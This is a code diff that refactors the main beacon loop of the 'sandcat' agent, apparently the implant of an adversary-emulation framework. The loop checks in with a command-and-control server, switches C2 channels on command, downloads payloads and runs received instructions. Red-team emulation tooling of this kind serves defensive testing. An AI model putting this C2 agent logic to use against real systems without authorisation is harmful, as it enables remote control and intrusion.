@@ -28,86 +28,87 @@ func Core(server string, group string, delay int, c2 map[string]string, p2pRecei
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Error when initializing agent: %s", err.Error()))
 		output.VerbosePrint("[-] Exiting.")
-	} else {
-		sandcatAgent.Display()
-		runAgent(sandcatAgent, c2)
-		sandcatAgent.Terminate()
+		return
 	}
+	sandcatAgent.Display()
+	runAgent(sandcatAgent)
+	sandcatAgent.Terminate()
 }
 
 // Establish contact with C2 and run instructions.
-func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
+func runAgent (sandcatAgent *agent.Agent) {
 	// Start main execution loop.
-	watchdog := 0
-	checkin := time.Now()
+	sandcatAgent.UpdateCheckinTime(time.Now())
 	lastDiscovery := time.Now()
-	for (evaluateWatchdog(checkin, watchdog)) {
-		// Send beacon and get response.
+	for (sandcatAgent.EvaluateWatchdog()) {
+		// Send beacon and process response.
 		beacon := sandcatAgent.Beacon()
+		processBeaconResponse(sandcatAgent, beacon)
 
-		// Process beacon response.
-		if len(beacon) != 0 {
-			sandcatAgent.SetPaw(beacon["paw"].(string))
-			checkin = time.Now()
-		}
-
-		// Check if we need to change contacts
-		if beacon["new_contact"] != nil {
-			newChannel := beacon["new_contact"].(string)
-			c2Config["c2Name"] = newChannel
-			output.VerbosePrint(fmt.Sprintf("Received request to switch from C2 channel %s to %s", sandcatAgent.GetCurrentContactName(), newChannel))
-			if err := sandcatAgent.AttemptSelectComChannel(c2Config, newChannel); err != nil {
-				output.VerbosePrint(fmt.Sprintf("[!] Error switching communication channels: %s", err.Error()))
-			}
-		}
-
-		// Handle instructions
-		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
-			// Run commands and send results.
-			instructions := reflect.ValueOf(beacon["instructions"])
-			for i := 0; i < instructions.Len(); i++ {
-				marshaledInstruction := instructions.Index(i).Elem().String()
-				var instruction map[string]interface{}
-				if err := json.Unmarshal([]byte(marshaledInstruction), &instruction); err != nil {
-					output.VerbosePrint(fmt.Sprintf("[-] Error unpacking command: %v", err.Error()))
-				} else {
-					// If instruction is deadman, save it for later. Otherwise, run the instruction.
-					if (instruction["deadman"].(bool)) {
-						output.VerbosePrint(fmt.Sprintf("[*] Received deadman instruction %s", instruction["id"]))
-						sandcatAgent.StoreDeadmanInstruction(instruction)
-					} else {
-						output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", instruction["id"]))
-						droppedPayloads := sandcatAgent.DownloadPayloads(instruction["payloads"].([]interface{}))
-						go sandcatAgent.RunInstruction(instruction, droppedPayloads, true)
-						sandcatAgent.Sleep(instruction["sleep"].(float64))
-					}
-				}
-			}
-		} else {
-			var sleepDuration float64
-			if len(beacon) > 0 {
-				sleepDuration = float64(beacon["sleep"].(int))
-				watchdog = beacon["watchdog"].(int)
-			} else {
-				// Failed beacon
-				if err := sandcatAgent.HandleBeaconFailure(); err != nil {
-					output.VerbosePrint(fmt.Sprintf("[!] Error handling failed beacon: %s", err.Error()))
-					return
-				}
-				sleepDuration = float64(15)
-			}
-			sandcatAgent.Sleep(sleepDuration)
-		}
 		// randomly check for dynamically discoverable peer agents on the network
 		if findPeers(lastDiscovery, sandcatAgent) {
-		    lastDiscovery = time.Now()
+			lastDiscovery = time.Now()
 		}
 	}
 }
 
-// Returns true if agent should keep running, false if not.
-func evaluateWatchdog(lastcheckin time.Time, watchdog int) bool {
-	return watchdog <= 0 || float64(time.Now().Sub(lastcheckin).Seconds()) <= float64(watchdog)
+func processBeaconResponse(sandcatAgent *agent.Agent, beacon map[string]interface{}) {
+	// Process beacon response.
+	if len(beacon) != 0 {
+		sandcatAgent.SetPaw(beacon["paw"].(string))
+		sandcatAgent.UpdateCheckinTime(time.Now())
+		sandcatAgent.SetWatchdog(beacon["watchdog"].(int))
+		sandcatAgent.MarkCurrCommsAsSuccessful()
+	} else {
+		// Failed beacon
+		if err := sandcatAgent.HandleBeaconFailure(); err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error handling failed beacon: %s", err.Error()))
+		}
+		sandcatAgent.Sleep(float64(15))
+		return
+	}
+
+	// Check if we need to change contacts
+	if beacon["new_contact"] != nil {
+		changeAgentContact(sandcatAgent, beacon["new_contact"].(string))
+	}
+
+	// Handle instructions
+	if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
+		handleInstructions(sandcatAgent, beacon["instructions"])
+	} else {
+		sandcatAgent.Sleep(float64(beacon["sleep"].(int)))
+	}
+}
+
+func changeAgentContact(sandcatAgent *agent.Agent, newChannel string) {
+	output.VerbosePrint(fmt.Sprintf("Received request to switch from C2 channel %s to %s", sandcatAgent.GetCurrentContactName(), newChannel))
+	if err := sandcatAgent.SwitchC2Contact(newChannel, ""); err != nil {
+		output.VerbosePrint(fmt.Sprintf("[!] Error switching communication channels: %s", err.Error()))
+	}
+}
+
+func handleInstructions(sandcatAgent *agent.Agent, instructionsList interface{}) {
+	// Run commands and send results.
+	instructions := reflect.ValueOf(instructionsList)
+	for i := 0; i < instructions.Len(); i++ {
+		marshaledInstruction := instructions.Index(i).Elem().String()
+		var instruction map[string]interface{}
+		if err := json.Unmarshal([]byte(marshaledInstruction), &instruction); err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Error unpacking command: %v", err.Error()))
+		} else {
+			// If instruction is deadman, save it for later. Otherwise, run the instruction.
+			if (instruction["deadman"].(bool)) {
+				output.VerbosePrint(fmt.Sprintf("[*] Received deadman instruction %s", instruction["id"]))
+				sandcatAgent.StoreDeadmanInstruction(instruction)
+			} else {
+				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", instruction["id"]))
+				droppedPayloads := sandcatAgent.DownloadPayloads(instruction["payloads"].([]interface{}))
+				go sandcatAgent.RunInstruction(instruction, droppedPayloads, true)
+				sandcatAgent.Sleep(instruction["sleep"].(float64))
+			}
+		}
+	}
 }
 
 func findPeers(last time.Time, sandcatAgent *agent.Agent) bool {
